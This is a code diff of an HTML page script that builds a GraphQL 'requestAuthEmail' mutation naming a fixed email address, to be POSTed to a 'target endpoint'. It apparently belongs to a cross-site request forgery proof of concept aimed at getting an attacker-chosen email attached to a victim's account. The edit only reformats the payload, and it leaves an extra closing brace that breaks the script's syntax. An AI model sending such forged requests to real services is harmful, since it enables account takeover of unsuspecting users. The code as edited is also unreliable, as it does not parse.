@@ -9,26 +9,11 @@
     <script>
         // Prepare the payload
         const payload = {
-            operationName: "requestAuthEmail",
-            variables: {
-                authEmail: "awyea1652@gmail.com"
+            "operationName": "requestAuthEmail",
+           "variables": {
+                "authEmail": "awyea1652@gmail.com"
             },
-            query: `
-                mutation requestAuthEmail($authEmail: String!) {
-                    requestAuthEmail(authEmail: $authEmail) {
-                        user {
-                            id
-                            pendingEmails
-                            __typename
-                        }
-                        error {
-                            code
-                            __typename
-                        }
-                        __typename
-                    }
-                }
-            `
+            "query":"mutation requestAuthEmail($authEmail: String!) {\n  requestAuthEmail(authEmail: $authEmail) {\n    user {\n      id\n      pendingEmails\n      __typename\n    }\n    error {\n      code\n      __typename\n    }\n    __typename\n  }\n}"}
         };
 
         // Make the POST request to the target endpoint
